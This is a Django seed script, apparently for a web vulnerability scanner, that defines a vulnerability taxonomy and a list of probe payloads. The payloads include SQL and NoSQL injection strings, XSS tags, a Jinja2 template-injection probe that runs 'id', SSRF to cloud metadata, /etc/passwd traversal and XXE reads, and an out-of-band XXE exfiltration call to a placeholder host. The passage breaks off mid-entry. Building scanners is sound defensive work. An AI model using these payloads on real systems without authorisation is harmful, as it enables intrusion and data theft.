"""Knowledge DB 시드 — VulnerabilityEntry + PayloadPattern 기본 세트.

사용:
    python manage.py seed_knowledge              # upsert (기본)
    python manage.py seed_knowledge --reset      # 기존 데이터 삭제 후 재시드
"""
from __future__ import annotations

from django.core.management.base import BaseCommand
from django.db import transaction

from api.embedding_service import (
    EMBEDDING_MODEL,
    embed_documents,
    is_available as embeddings_available,
    pattern_text,
)
from api.models import PayloadPattern, VulnerabilityEntry


# ── 취약점 정의 (PayloadsAllTheThings-style taxonomy) ──────────

VULN_SEED: list[dict] = [
    # ── Injection 계열 ────────────────────────────────────
    {
        "title": "SQL Injection",
        "vuln_type": "sqli",
        "cwe_id": "CWE-89",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "high",
        "description": (
            "사용자 입력이 SQL 쿼리에 직접 삽입되어, 데이터 유출/인증 우회/원격 코드 실행으로 이어질 수 있다."
        ),
        "preconditions": "요청 파라미터가 쿼리 컨텍스트(WHERE, ORDER BY 등)에 주입됨. prepared statement 미사용.",
        "impact": "DB 덤프, 인증 우회, 2차 RCE",
        "false_positive_hints": (
            "500 에러가 단순한 SQL 구문 오류일 수 있음. boolean-based/time-based로 확증하고 결과 폭을 비교."
        ),
        "evidence_points": "에러 문구 노출, true/false 응답 길이 차이, SLEEP 응답 지연.",
        "tags": ["injection", "db"],
    },
    {
        "title": "NoSQL Injection",
        "vuln_type": "nosqli",
        "cwe_id": "CWE-943",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "high",
        "description": (
            "MongoDB/CouchDB 등 NoSQL 쿼리에 사용자 입력이 주입되어 인증 우회, 데이터 유출이 가능하다. "
            "$gt/$ne 연산자 주입, JSON body 조작, JavaScript injection 등."
        ),
        "preconditions": "JSON body 또는 쿼리 파라미터가 NoSQL 쿼리 객체에 직접 전달됨.",
        "impact": "인증 우회, DB 전체 덤프, DoS",
        "false_positive_hints": "정상 JSON 에러와 구분 필요. $ne/$gt 결과 차이 확인.",
        "evidence_points": "$ne 연산자로 인증 우회 성공, 쿼리 결과 차이.",
        "tags": ["injection", "nosql", "mongodb"],
    },
    {
        "title": "Cross-Site Scripting (XSS)",
        "vuln_type": "xss",
        "cwe_id": "CWE-79",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "medium",
        "description": "사용자 입력이 HTML/JS 컨텍스트에 escape 없이 렌더링된다.",
        "preconditions": "입력이 HTML body, attribute, JS 리터럴, URL 컨텍스트에 반영됨.",
        "impact": "세션 탈취, CSRF 트리거, UI 조작",
        "false_positive_hints": (
            "입력이 반영되어도 `<`, `>`, `\"` 가 엔티티로 인코딩되면 실행 불가. "
            "실제 브라우저 렌더링 또는 CSP 확인 필수."
        ),
        "evidence_points": "페이로드가 원문 그대로 응답에 포함되고, 브라우저에서 JS 실행되는 스샷.",
        "tags": ["xss", "client"],
    },
    {
        "title": "Command Injection",
        "vuln_type": "cmdi",
        "cwe_id": "CWE-78",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "critical",
        "description": "사용자 입력이 shell 명령에 concat되어 임의 명령 실행이 가능하다.",
        "preconditions": "system(), exec(), subprocess(shell=True) 등에 사용자 입력 전달.",
        "impact": "RCE, 서버 장악",
        "false_positive_hints": (
            "sleep 기반 시간 차이, 독립 아웃바운드 DNS 콜백(OOB)로 확증. 에러만으로 판단 금지."
        ),
        "evidence_points": "OOB DNS 콜백, sleep 기반 응답 지연.",
        "tags": ["injection", "rce"],
    },
    {
        "title": "Server-Side Template Injection (SSTI)",
        "vuln_type": "ssti",
        "cwe_id": "CWE-1336",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "critical",
        "description": (
            "사용자 입력이 서버 측 템플릿 엔진(Jinja2, Twig, Freemarker 등)에 주입되어 "
            "임의 코드 실행이 가능하다."
        ),
        "preconditions": "사용자 입력이 render_template_string() 등 템플릿 컨텍스트에 직접 삽입.",
        "impact": "RCE, 파일 읽기/쓰기, 서버 장악",
        "false_positive_hints": "{{7*7}}=49 확인 후, 실제 코드 실행 가능 여부 검증.",
        "evidence_points": "{{7*7}}=49 반영, __class__.__mro__ 체인 실행 성공.",
        "tags": ["injection", "template", "rce"],
    },
    {
        "title": "LDAP Injection",
        "vuln_type": "ldap_injection",
        "cwe_id": "CWE-90",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "high",
        "description": "LDAP 쿼리에 사용자 입력이 삽입되어 인증 우회, 디렉터리 정보 유출이 가능하다.",
        "preconditions": "사용자 입력이 LDAP filter에 직접 전달. 이스케이프 미적용.",
        "impact": "인증 우회, 디렉터리 전체 덤프",
        "false_positive_hints": "LDAP 에러만으로 판단 금지. 실제 결과 차이 확인.",
        "evidence_points": "*)(&로 필터 조작 성공, 인증 우회 증거.",
        "tags": ["injection", "ldap"],
    },
    {
        "title": "XPath Injection",
        "vuln_type": "xpath_injection",
        "cwe_id": "CWE-643",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "high",
        "description": "XPath 쿼리에 사용자 입력이 삽입되어 XML 데이터 유출/인증 우회가 가능하다.",
        "preconditions": "사용자 입력이 XPath expression에 직접 전달.",
        "impact": "XML 데이터 전체 노출, 인증 우회",
        "false_positive_hints": "XPath 구문 에러와 실제 주입 구분. boolean 조건 결과 차이 확인.",
        "evidence_points": "' or '1'='1 로 인증 우회, XML 노드 데이터 노출.",
        "tags": ["injection", "xpath", "xml"],
    },
    {
        "title": "GraphQL Injection",
        "vuln_type": "graphql",
        "cwe_id": "CWE-89",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "high",
        "description": (
            "GraphQL introspection 노출, batching 공격, 깊은 쿼리를 통한 DoS, "
            "필드 injection으로 인가되지 않은 데이터 접근."
        ),
        "preconditions": "GraphQL endpoint 노출. introspection 활성화 또는 쿼리 depth 제한 미설정.",
        "impact": "스키마 노출, 인가되지 않은 데이터 접근, DoS",
        "false_positive_hints": "introspection만으로는 취약점이 아닐 수 있음. 실제 민감 데이터 접근 확인.",
        "evidence_points": "introspection으로 숨겨진 mutation/query 발견, 권한 없는 데이터 조회 성공.",
        "tags": ["injection", "graphql", "api"],
    },
    # ── 파일 계열 ─────────────────────────────────────────
    {
        "title": "Local File Inclusion (LFI)",
        "vuln_type": "lfi",
        "cwe_id": "CWE-98",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "high",
        "description": "파일 경로 파라미터가 검증 없이 include()/require() 등에 전달되어 임의 파일을 실행한다.",
        "preconditions": "filename 파라미터가 include/require에 전달. path traversal 차단 미흡.",
        "impact": "소스코드/설정 노출, /etc/passwd 읽기, PHP wrapper 통한 RCE",
        "false_positive_hints": (
            "open_basedir나 chroot로 경로가 제한될 수 있음. 실제 민감 파일 내용이 응답에 포함돼야 확증."
        ),
        "evidence_points": "/etc/passwd 형식 본문, php://filter base64 출력.",
        "tags": ["file", "inclusion"],
    },
    {
        "title": "Path Traversal",
        "vuln_type": "path_traversal",
        "cwe_id": "CWE-22",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "high",
        "description": (
            "사용자 입력이 파일 경로에 삽입되어 ../ 등으로 의도된 디렉터리를 벗어나 임의 파일을 읽는다. "
            "LFI와 달리 include/실행이 아닌 파일 읽기에 해당."
        ),
        "preconditions": "filename/path 파라미터가 open()/read() 등에 전달. ../ 필터링 미흡.",
        "impact": "소스코드/설정 파일 노출, 비밀키 유출",
        "false_positive_hints": "경로 정규화(realpath)가 적용되면 무력화. 실제 파일 내용 확인.",
        "evidence_points": "../../../../etc/passwd 등으로 시스템 파일 내용 노출.",
        "tags": ["file", "traversal"],
    },
    {
        "title": "File Upload Vulnerability",
        "vuln_type": "file_upload",
        "cwe_id": "CWE-434",
        "owasp_category": "A04:2021-Insecure Design",
        "severity_default": "high",
        "description": (
            "파일 업로드 검증 미흡으로 웹셸, 악성 파일 업로드가 가능하다. "
            "MIME 타입 우회, 확장자 우회, 이중 확장자, EXIF 메타데이터 악용 등."
        ),
        "preconditions": "파일 업로드 기능 존재. 확장자/MIME/내용 검증 미흡.",
        "impact": "웹셸 업로드를 통한 RCE, 저장된 XSS",
        "false_positive_hints": "업로드 성공해도 실행 가능 경로에 저장되지 않으면 RCE 불가.",
        "evidence_points": ".php/.jsp 확장자 업로드 후 실행 성공, EXIF 기반 payload 실행.",
        "tags": ["file", "upload", "rce"],
    },
    {
        "title": "XML External Entity (XXE)",
        "vuln_type": "xxe",
        "cwe_id": "CWE-611",
        "owasp_category": "A05:2021-Security Misconfiguration",
        "severity_default": "high",
        "description": (
            "XML 파서가 외부 엔티티를 처리하여 파일 읽기, SSRF, DoS(Billion Laughs)가 가능하다."
        ),
        "preconditions": "XML input 처리. DTD/외부 엔티티 파싱이 비활성화되지 않음.",
        "impact": "파일 읽기, SSRF, DoS",
        "false_positive_hints": "libxml2 2.9+ 기본 비활성화. 실제 파일 내용 또는 OOB 확인.",
        "evidence_points": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'> 로 파일 내용 노출.",
        "tags": ["xml", "xxe", "file"],
    },
    # ── 서버 취약점 ───────────────────────────────────────
    {
        "title": "Server-Side Request Forgery (SSRF)",
        "vuln_type": "ssrf",
        "cwe_id": "CWE-918",
        "owasp_category": "A10:2021-Server-Side Request Forgery",
        "severity_default": "high",
        "description": "사용자가 제공한 URL을 서버가 직접 호출한다. 메타데이터/내부망 접근 가능.",
        "preconditions": "요청이 외부 URL을 파라미터로 받아 서버 측 fetch 수행.",
        "impact": "클라우드 메타데이터 유출, 내부 서비스 스캔, RCE 체이닝",
        "false_positive_hints": (
            "allow-list가 적용되어 내부 주소가 실제로 거부되는지 확인. DNS rebinding 여지도 고려."
        ),
        "evidence_points": "169.254.169.254/internal host 응답 본문 일부가 에코되는 증거.",
        "tags": ["ssrf", "server"],
    },
    {
        "title": "Remote Code Execution (RCE)",
        "vuln_type": "rce",
        "cwe_id": "CWE-94",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "critical",
        "description": (
            "eval(), exec(), unserialize() 등을 통해 서버에서 임의 코드 실행이 가능하다. "
            "Command Injection(OS 명령)과 달리 언어 레벨의 코드 실행."
        ),
        "preconditions": "사용자 입력이 eval/exec/code 실행 함수에 전달.",
        "impact": "서버 완전 장악, 데이터 유출, 횡적 이동",
        "false_positive_hints": "sandbox/restricted eval 환경 여부 확인. 실제 코드 실행 증거 필요.",
        "evidence_points": "코드 실행 결과 반환, OOB 콜백, 파일 생성 증거.",
        "tags": ["rce", "code-execution"],
    },
    {
        "title": "Insecure Deserialization",
        "vuln_type": "deserialization",
        "cwe_id": "CWE-502",
        "owasp_category": "A08:2021-Software and Data Integrity Failures",
        "severity_default": "critical",
        "description": (
            "신뢰할 수 없는 데이터가 역직렬화되어 임의 객체 생성, RCE가 가능하다. "
            "Java(ObjectInputStream), Python(pickle), PHP(unserialize), Ruby(Marshal) 등."
        ),
        "preconditions": "사용자 입력이 역직렬화 함수에 전달. 클래스 허용 목록 미적용.",
        "impact": "RCE, 권한 상승, DoS",
        "false_positive_hints": "직렬화 형식 확인(base64, hex). gadget chain 존재 여부 검증.",
        "evidence_points": "ysoserial/pickle payload로 코드 실행 성공, OOB 콜백.",
        "tags": ["deserialization", "rce"],
    },
    {
        "title": "HTTP Request Smuggling",
        "vuln_type": "http_smuggling",
        "cwe_id": "CWE-444",
        "owasp_category": "A05:2021-Security Misconfiguration",
        "severity_default": "high",
        "description": (
            "프론트엔드/백엔드 간 HTTP 파싱 불일치를 악용하여 요청을 밀어 넣는다. "
            "CL.TE, TE.CL, TE.TE 변형."
        ),
        "preconditions": "리버스 프록시 + 백엔드 구조. Transfer-Encoding/Content-Length 처리 불일치.",
        "impact": "캐시 포이즌, 인증 우회, 요청 하이재킹",
        "false_positive_hints": "타이밍 기반 탐지 오탐 가능. CL.TE/TE.CL 양쪽 확인.",
        "evidence_points": "밀어 넣은 요청이 다른 사용자 응답에 영향, 타이밍 차이.",
        "tags": ["http", "smuggling", "proxy"],
    },
    {
        "title": "Race Condition",
        "vuln_type": "race_condition",
        "cwe_id": "CWE-362",
        "owasp_category": "A04:2021-Insecure Design",
        "severity_default": "medium",
        "description": (
            "동시 요청을 통해 TOCTOU(Time-of-check to Time-of-use) 취약점을 악용한다. "
            "쿠폰 중복 사용, 잔액 초과 인출, 파일 경쟁 조건 등."
        ),
        "preconditions": "상태 변경 연산에 적절한 잠금/트랜잭션 미적용.",
        "impact": "비즈니스 로직 우회, 금전적 손실, 권한 상승",
        "false_positive_hints": "네트워크 지연으로 동시 도달 실패 가능. 여러 번 반복 테스트.",
        "evidence_points": "동시 요청으로 잔액 초과 인출 또는 쿠폰 중복 적용 성공.",
        "tags": ["race", "concurrency", "logic"],
    },
    # ── 인증/인가 계열 ────────────────────────────────────
    {
        "title": "Insecure Direct Object Reference (IDOR)",
        "vuln_type": "idor",
        "cwe_id": "CWE-639",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "high",
        "description": "식별자(id/uid)를 바꿔 다른 사용자의 리소스에 인가 없이 접근한다.",
        "preconditions": "URL/Body에 수치/UUID 식별자가 있고, 서버가 소유자 체크를 수행하지 않음.",
        "impact": "타 사용자 PII 노출, 권한 상승",
        "false_positive_hints": (
            "동일 테넌트의 공개 리소스는 false positive. 서로 다른 세션(persona_a vs persona_b) "
            "간 응답 차이와 민감 필드 포함 여부로 확증."
        ),
        "evidence_points": "persona_b 토큰으로 persona_a 리소스 200 + 민감 필드 노출.",
        "tags": ["access-control", "authorization"],
    },
    {
        "title": "Broken Access Control",
        "vuln_type": "access_control",
        "cwe_id": "CWE-284",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "high",
        "description": (
            "수평적/수직적 권한 상승. 관리자 전용 기능에 일반 사용자가 접근, "
            "역할 기반 접근 제어 우회, 강제 브라우징 등."
        ),
        "preconditions": "역할/권한 검사가 클라이언트 측에서만 수행되거나 미흡.",
        "impact": "권한 상승, 관리자 기능 실행, 데이터 변조",
        "false_positive_hints": "공개 API와 보호 API 구분. 실제 권한 없는 사용자로 테스트.",
        "evidence_points": "일반 사용자 토큰으로 관리자 endpoint 접근 성공.",
        "tags": ["access-control", "authorization", "privilege-escalation"],
    },
    {
        "title": "Authentication Bypass",
        "vuln_type": "auth_bypass",
        "cwe_id": "CWE-287",
        "owasp_category": "A07:2021-Identification and Authentication Failures",
        "severity_default": "critical",
        "description": (
            "인증 메커니즘 자체를 우회하여 로그인 없이 접근한다. "
            "기본 자격증명, 인증 로직 결함, 세션 고정, 토큰 위조 등."
        ),
        "preconditions": "인증 로직에 결함 존재. 기본 비밀번호 미변경 또는 검증 우회 가능.",
        "impact": "무인가 접근, 계정 탈취, 관리자 접근",
        "false_positive_hints": "공개 endpoint와 구분. 실제 인증 없이 보호 리소스 접근 확인.",
        "evidence_points": "인증 헤더 없이 보호 API 접근 성공, 토큰 조작으로 권한 획득.",
        "tags": ["authentication", "bypass"],
    },
    {
        "title": "Cross-Site Request Forgery (CSRF)",
        "vuln_type": "csrf",
        "cwe_id": "CWE-352",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "medium",
        "description": "인증된 사용자의 브라우저에서 의도하지 않은 요청을 강제 실행한다.",
        "preconditions": "상태 변경 요청에 CSRF 토큰 미적용. SameSite 쿠키 미설정.",
        "impact": "비밀번호 변경, 송금, 설정 변경 등 사용자 대행",
        "false_positive_hints": "SameSite=Strict/Lax, CSRF 토큰, Referer 검증 확인.",
        "evidence_points": "외부 도메인에서 상태 변경 요청 성공 (PoC HTML).",
        "tags": ["csrf", "client"],
    },
    {
        "title": "JWT Attack",
        "vuln_type": "jwt",
        "cwe_id": "CWE-345",
        "owasp_category": "A07:2021-Identification and Authentication Failures",
        "severity_default": "high",
        "description": (
            "JWT 토큰 취약점: none 알고리즘, 약한 시크릿, 알고리즘 혼동(RS→HS), "
            "kid injection, jku/x5u 조작 등."
        ),
        "preconditions": "JWT 인증 사용. 알고리즘 검증 미흡 또는 약한 시크릿.",
        "impact": "토큰 위조, 권한 상승, 계정 탈취",
        "false_positive_hints": "알고리즘 고정(RS256 only) 확인. 실제 위조 토큰으로 접근 테스트.",
        "evidence_points": "none 알고리즘 또는 약한 키로 위조한 토큰이 서버에서 수락됨.",
        "tags": ["jwt", "authentication", "token"],
    },
    {
        "title": "Open Redirect",
        "vuln_type": "open_redirect",
        "cwe_id": "CWE-601",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "medium",
        "description": "redirect 대상 URL을 사용자가 제어해 피싱/세션 탈취에 이용할 수 있다.",
        "preconditions": "?next=/?returnTo= 등의 파라미터가 외부 URL을 허용.",
        "impact": "피싱, OAuth 코드 탈취",
        "false_positive_hints": "same-origin만 허용되면 악용 불가. 스킴과 호스트 비교.",
        "evidence_points": "Location 헤더 또는 meta refresh 가 공격자 도메인으로 지정됨.",
        "tags": ["redirect"],
    },
    # ── 클라이언트 취약점 ─────────────────────────────────
    {
        "title": "Prototype Pollution",
        "vuln_type": "prototype_pollution",
        "cwe_id": "CWE-1321",
        "owasp_category": "A03:2021-Injection",
        "severity_default": "medium",
        "description": (
            "JavaScript 객체의 __proto__ / constructor.prototype 조작을 통해 "
            "모든 객체에 속성을 주입한다."
        ),
        "preconditions": "사용자 입력이 deep merge/clone 함수에 전달. __proto__ 필터링 미적용.",
        "impact": "XSS, RCE(서버 측 Node.js), 인증 우회",
        "false_positive_hints": "클라이언트/서버 구분. 실제 속성 주입이 영향을 주는지 확인.",
        "evidence_points": "__proto__.isAdmin=true 등으로 권한 상승 또는 XSS 트리거.",
        "tags": ["prototype", "javascript", "pollution"],
    },
    {
        "title": "CORS Misconfiguration",
        "vuln_type": "cors",
        "cwe_id": "CWE-942",
        "owasp_category": "A05:2021-Security Misconfiguration",
        "severity_default": "medium",
        "description": (
            "Access-Control-Allow-Origin이 공격자 도메인을 허용하여 "
            "인증된 사용자의 데이터를 cross-origin으로 탈취할 수 있다."
        ),
        "preconditions": "CORS 설정이 Origin 헤더를 reflect 하거나 null을 허용. credentials: true.",
        "impact": "인증된 사용자의 민감 데이터 탈취",
        "false_positive_hints": "credentials: false면 세션 쿠키 미전송. 실제 민감 데이터 접근 확인.",
        "evidence_points": "공격자 도메인 Origin에 대해 ACAO + ACAC: true 응답.",
        "tags": ["cors", "client", "misconfiguration"],
    },
    # ── 정보 노출 / 로직 ─────────────────────────────────
    {
        "title": "Information Disclosure",
        "vuln_type": "information_disclosure",
        "cwe_id": "CWE-200",
        "owasp_category": "A01:2021-Broken Access Control",
        "severity_default": "medium",
        "description": (
            "디버그 정보, 스택 트레이스, 소스코드, 내부 경로, API 키 등이 노출된다. "
            ".git 디렉터리 노출, 환경변수 유출, 에러 메시지 상세 정보 등."
        ),
        "preconditions": "디버그 모드 활성화, 에러 핸들링 미흡, 민감 파일 접근 가능.",
        "impact": "내부 구조 파악, 2차 공격 지원, 자격증명 유출",
        "false_positive_hints": "공개 정보와 민감 정보 구분. 실제 악용 가능성 평가.",
        "evidence_points": ".git/config 노출, 스택 트레이스 내 소스경로, 환경변수 값 노출.",
        "tags": ["information", "disclosure", "recon"],
    },
    {
        "title": "Business Logic Flaw",
        "vuln_type": "logic_flaw",
        "cwe_id": "CWE-840",
        "owasp_category": "A04:2021-Insecure Design",
        "severity_default": "medium",
        "description": (
            "비즈니스 로직의 설계 결함을 악용. 가격 조작, 수량 음수, "
            "프로세스 단계 건너뛰기, 상태 머신 우회 등."
        ),
        "preconditions": "비즈니스 로직에 서버 측 검증 미흡.",
        "impact": "금전적 손실, 서비스 악용, 권한 상승",
        "false_positive_hints": "의도된 기능과 구분. 실제 비즈니스 영향 평가.",
        "evidence_points": "음수 수량으로 결제 우회, 단계 건너뛰기로 제한 회피.",
        "tags": ["logic", "business", "design"],
    },
]


# ── 페이로드 패턴 ──────────────────────────────────────────────
# 각 항목의 vuln_type은 위 VULN_SEED와 매치되어야 한다.

PATTERN_SEED: list[dict] = [
    # ── SQLi ─────────────────────────────────────────────
    {
        "vuln_type": "sqli",
        "name": "SQLi boolean-based OR 1=1",
        "sub_technique": "boolean_based",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=1' OR '1'='1",
        "matcher": {"type": "response_diff", "compare_to": "baseline", "indicator": "row_count_increase"},
        "safety_notes": "읽기 전용. WHERE 절 조작만 수행.",
        "tags": ["boolean-based"],
    },
    {
        "vuln_type": "sqli",
        "name": "SQLi error-based single-quote",
        "sub_technique": "error_based",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=1'",
        "matcher": {"type": "regex", "pattern": "(?i)(sql syntax|sqlite|mysql|psql|ORA-|unclosed quotation)"},
        "safety_notes": "단순 에러 노출 확인용.",
        "tags": ["error-based"],
    },
    {
        "vuln_type": "sqli",
        "name": "SQLi time-based SLEEP",
        "sub_technique": "time_based",
        "category": "verification",
        "safety_level": "cautious",
        "request_template": "{param}=1 AND SLEEP(3)--",
        "matcher": {"type": "timing", "threshold_ms": 2500},
        "safety_notes": "요청 지연 유발. 서비스 영향 있을 수 있으니 저빈도로만 사용.",
        "tags": ["time-based"],
        "request_cost": 3,
    },
    {
        "vuln_type": "sqli",
        "name": "SQLi UNION SELECT column-probe",
        "sub_technique": "union_based",
        "category": "exploitation",
        "safety_level": "cautious",
        "request_template": "{param}=1 UNION SELECT NULL,NULL,NULL--",
        "matcher": {"type": "response_diff", "indicator": "column_count_match"},
        "safety_notes": "컬럼 수 탐색. 데이터 변경 없음.",
        "tags": ["union-based"],
    },
    # ── NoSQL Injection ──────────────────────────────────
    {
        "vuln_type": "nosqli",
        "name": "NoSQLi operator injection $ne",
        "sub_technique": "operator_injection",
        "category": "detection",
        "safety_level": "safe",
        "request_template": '{param}[$ne]=invalid',
        "matcher": {"type": "response_diff", "indicator": "auth_bypass_or_data_leak"},
        "safety_notes": "$ne 연산자로 조건 우회.",
        "tags": ["nosql", "operator"],
    },
    {
        "vuln_type": "nosqli",
        "name": "NoSQLi JSON body $gt",
        "sub_technique": "operator_injection",
        "category": "detection",
        "safety_level": "safe",
        "request_template": '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        "matcher": {"type": "response_diff", "indicator": "auth_bypass"},
        "safety_notes": "JSON body를 통한 MongoDB 연산자 주입.",
        "tags": ["nosql", "json-body"],
    },
    # ── XSS ──────────────────────────────────────────────
    {
        "vuln_type": "xss",
        "name": "XSS reflected script tag",
        "sub_technique": "reflected",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=<script>WATCHDOG_XSS()</script>",
        "matcher": {"type": "reflection", "needle": "<script>WATCHDOG_XSS()</script>"},
        "safety_notes": "본문 HTML 원문 반사 확인.",
        "tags": ["reflected"],
    },
    {
        "vuln_type": "xss",
        "name": "XSS attribute-break via onmouseover",
        "sub_technique": "attribute_escape",
        "category": "detection",
        "safety_level": "safe",
        "request_template": '{param}=" onmouseover=WATCHDOG_XSS() x="',
        "matcher": {"type": "reflection", "needle": "onmouseover=WATCHDOG_XSS()"},
        "safety_notes": "속성 컨텍스트 탈출 여부.",
        "tags": ["attribute"],
    },
    {
        "vuln_type": "xss",
        "name": "XSS img onerror",
        "sub_technique": "tag_injection",
        "category": "verification",
        "safety_level": "safe",
        "request_template": "{param}=<img src=x onerror=WATCHDOG_XSS()>",
        "matcher": {"type": "reflection", "needle": "onerror=WATCHDOG_XSS()"},
        "safety_notes": "script 필터 우회 확인.",
        "tags": ["html-injection"],
    },
    # ── SSTI ─────────────────────────────────────────────
    {
        "vuln_type": "ssti",
        "name": "SSTI detection {{7*7}}",
        "sub_technique": "detection_probe",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}={{7*7}}",
        "matcher": {"type": "reflection", "needle": "49"},
        "safety_notes": "템플릿 엔진 존재 여부 확인. 부작용 없음.",
        "tags": ["ssti", "detection"],
    },
    {
        "vuln_type": "ssti",
        "name": "SSTI Jinja2 RCE probe",
        "sub_technique": "jinja2_rce",
        "category": "exploitation",
        "safety_level": "cautious",
        "request_template": (
            "{param}={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ),
        "matcher": {"type": "regex", "pattern": "uid=\\d+"},
        "safety_notes": "Jinja2 환경에서 RCE 시도. 실행 환경 확인 후 사용.",
        "tags": ["ssti", "jinja2", "rce"],
    },
    # ── IDOR ─────────────────────────────────────────────
    {
        "vuln_type": "idor",
        "name": "IDOR sequential id probe",
        "sub_technique": "sequential_id",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}={neighbor_id}",
        "matcher": {"type": "persona_diff", "indicator": "200_with_sensitive_fields"},
        "safety_notes": "보통 1→2→3. 다른 테넌트 접근 여부 확인.",
        "tags": ["access-control"],
    },
    {
        "vuln_type": "idor",
        "name": "IDOR uuid swap between personas",
        "sub_technique": "uuid_swap",
        "category": "verification",
        "safety_level": "safe",
        "request_template": "{param}={persona_b_uuid}",
        "matcher": {"type": "persona_diff", "indicator": "cross_tenant_success"},
        "safety_notes": "persona_a 토큰으로 persona_b 리소스 획득 여부.",
        "tags": ["access-control"],
    },
    # ── SSRF ─────────────────────────────────────────────
    {
        "vuln_type": "ssrf",
        "name": "SSRF cloud metadata probe",
        "sub_technique": "cloud_metadata",
        "category": "detection",
        "safety_level": "cautious",
        "request_template": "{param}=http://169.254.169.254/latest/meta-data/",
        "matcher": {"type": "regex", "pattern": "(?i)(ami-id|instance-id|iam/security-credentials)"},
        "safety_notes": "AWS 메타데이터 노출 확인. 금지된 호스트 응답을 담지 말 것.",
        "tags": ["cloud-metadata"],
    },
    {
        "vuln_type": "ssrf",
        "name": "SSRF localhost loopback",
        "sub_technique": "loopback",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=http://127.0.0.1:80/",
        "matcher": {"type": "response_diff", "indicator": "internal_banner"},
        "safety_notes": "loopback 호출 가능 여부.",
        "tags": ["loopback"],
    },
    {
        "vuln_type": "ssrf",
        "name": "SSRF OOB DNS callback",
        "sub_technique": "oob_callback",
        "category": "verification",
        "safety_level": "cautious",
        "request_template": "{param}=http://{oob_domain}/",
        "matcher": {"type": "oob", "channel": "dns"},
        "safety_notes": "interactsh 등 OOB 도메인 필요.",
        "tags": ["oob"],
        "request_cost": 2,
    },
    {
        "vuln_type": "ssrf",
        "name": "SSRF IPv6 loopback bypass",
        "sub_technique": "ipv6_bypass",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=http://[::]:80/",
        "matcher": {"type": "response_diff", "indicator": "internal_banner"},
        "safety_notes": "IPv6 unspecified address로 localhost 필터 우회.",
        "tags": ["bypass", "ipv6"],
    },
    {
        "vuln_type": "ssrf",
        "name": "SSRF decimal IP bypass",
        "sub_technique": "ip_encoding_bypass",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=http://2130706433/",
        "matcher": {"type": "response_diff", "indicator": "internal_banner"},
        "safety_notes": "127.0.0.1의 decimal 표현으로 필터 우회.",
        "tags": ["bypass", "encoding"],
    },
    # ── LFI ──────────────────────────────────────────────
    {
        "vuln_type": "lfi",
        "name": "LFI etc/passwd traversal",
        "sub_technique": "basic_traversal",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=../../../../etc/passwd",
        "matcher": {"type": "regex", "pattern": "^root:.*:0:0:"},
        "safety_notes": "unix 시스템 식별.",
        "tags": ["path-traversal"],
    },
    {
        "vuln_type": "lfi",
        "name": "LFI null byte (legacy)",
        "sub_technique": "null_byte_bypass",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=../../../../etc/passwd%00.png",
        "matcher": {"type": "regex", "pattern": "^root:.*:0:0:"},
        "safety_notes": "구버전 PHP/런타임 대상.",
        "tags": ["null-byte"],
    },
    {
        "vuln_type": "lfi",
        "name": "LFI php filter wrapper",
        "sub_technique": "php_wrapper",
        "category": "exploitation",
        "safety_level": "cautious",
        "request_template": "{param}=php://filter/convert.base64-encode/resource={file}",
        "matcher": {"type": "regex", "pattern": "^[A-Za-z0-9+/=]{40,}$"},
        "safety_notes": "PHP 대상. base64로 소스코드 유출.",
        "tags": ["php-wrapper"],
    },
    # ── Path Traversal ───────────────────────────────────
    {
        "vuln_type": "path_traversal",
        "name": "Path traversal dot-dot-slash",
        "sub_technique": "dot_dot_slash",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=../../../etc/passwd",
        "matcher": {"type": "regex", "pattern": "^root:.*:0:0:"},
        "safety_notes": "파일 읽기 경로 탈출 확인.",
        "tags": ["traversal"],
    },
    {
        "vuln_type": "path_traversal",
        "name": "Path traversal double-encoding",
        "sub_technique": "encoding_bypass",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=..%252f..%252f..%252fetc/passwd",
        "matcher": {"type": "regex", "pattern": "^root:.*:0:0:"},
        "safety_notes": "이중 URL 인코딩으로 필터 우회.",
        "tags": ["traversal", "encoding"],
    },
    # ── XXE ──────────────────────────────────────────────
    {
        "vuln_type": "xxe",
        "name": "XXE file read /etc/passwd",
        "sub_technique": "file_read",
        "category": "detection",
        "safety_level": "cautious",
        "request_template": (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<foo>&xxe;</foo>"
        ),
        "matcher": {"type": "regex", "pattern": "^root:.*:0:0:"},
        "safety_notes": "XML 파서 외부 엔티티 처리 확인.",
        "tags": ["xxe", "file-read"],
    },
    {
        "vuln_type": "xxe",
        "name": "XXE OOB via external DTD",
        "sub_technique": "oob_exfiltration",
        "category": "exploitation",
        "safety_level": "cautious",
        "request_template": (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob_domain}/xxe.dtd">'
            "%xxe;]><foo/>"
        ),
        "matcher": {"type": "oob", "channel": "http"},
        "safety_notes": "Blind XXE용 OOB exfiltration.",
